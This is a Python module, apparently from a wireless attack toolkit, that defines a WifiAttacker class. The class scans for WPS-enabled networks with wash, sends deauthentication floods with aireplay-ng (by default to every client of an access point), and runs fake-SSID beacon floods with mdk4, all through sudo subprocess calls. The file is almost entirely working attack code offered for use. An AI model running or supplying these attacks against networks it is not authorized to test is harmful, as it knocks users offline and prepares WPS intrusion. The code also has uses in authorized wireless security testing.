from core.event_bus import EventBus
from core.logger import get_logger
import subprocess
import re

log = get_logger("wifi.attacker")
bus = EventBus()

class WifiAttacker:
    def __init__(self, interface='wlan1'):
        self.interface = interface

    def wps_scan(self) -> list:
        """Escanea redes con WPS habilitado usando wash"""
        log.info("Iniciando WPS scan...")
        try:
            result = subprocess.run(
                ['sudo', 'wash', '-i', self.interface, '--scan', '-s'],
                capture_output=True, text=True, timeout=30
            )
            redes = []
            for line in result.stdout.splitlines():
                # wash output: BSSID | CH | dBm | WPS | Lck | Vendor | ESSID
                parts = line.split()
                if len(parts) >= 7 and ':' in parts[0]:
                    redes.append({
                        'bssid':   parts[0],
                        'channel': parts[1],
                        'rssi':    parts[2],
                        'wps_ver': parts[3],
                        'locked':  parts[4] == 'Yes',
                        'ssid':    ' '.join(parts[6:]),
                    })
            log.info(f"WPS scan completo: {len(redes)} redes encontradas")
            bus.publish_sync('wifi.wps_scan_done', {'redes': redes})
            return redes
        except subprocess.TimeoutExpired:
            log.error("WPS scan timeout")
            return []
        except FileNotFoundError:
            log.error("wash no instalado — sudo apt install reaver")
            return []
        except Exception as e:
            log.error(f"WPS scan error: {e}")
            return []

    def deauth(self, bssid: str, client: str = 'FF:FF:FF:FF:FF:FF', count: int = 10):
        """Envia paquetes deauth contra un AP o cliente especifico"""
        log.warning(f"Deauth → AP:{bssid} Cliente:{client} Count:{count}")
        try:
            result = subprocess.run(
                ['sudo', 'aireplay-ng',
                 '--deauth', str(count),
                 '-a', bssid,
                 '-c', client,
                 self.interface],
                capture_output=True, text=True, timeout=30
            )
            success = result.returncode == 0
            bus.publish_sync('wifi.deauth_sent', {
                'bssid':   bssid,
                'client':  client,
                'count':   count,
                'success': success,
            })
            return success
        except Exception as e:
            log.error(f"Deauth error: {e}")
            return False

    def beacon_flood(self, ssid: str, count: int = 100):
        """Envia beacon flood con un SSID falso usando mdk4"""
        log.warning(f"Beacon flood → SSID:{ssid}")
        try:
            # Crear archivo de SSIDs para mdk4
            with open('/tmp/ssid_list.txt', 'w') as f:
                f.write(f"{ssid}\n")
            result = subprocess.run(
                ['sudo', 'mdk4', self.interface, 'b',
                 '-f', '/tmp/ssid_list.txt',
                 '-c', '6'],
                capture_output=True, text=True, timeout=15
            )
            success = result.returncode == 0
            bus.publish_sync('wifi.beacon_flood_sent', {
                'ssid':    ssid,
                'success': success,
            })
            return success
        except FileNotFoundError:
            log.error("mdk4 no instalado — sudo apt install mdk4")
            return False
        except Exception as e:
            log.error(f"Beacon flood error: {e}")
            return False
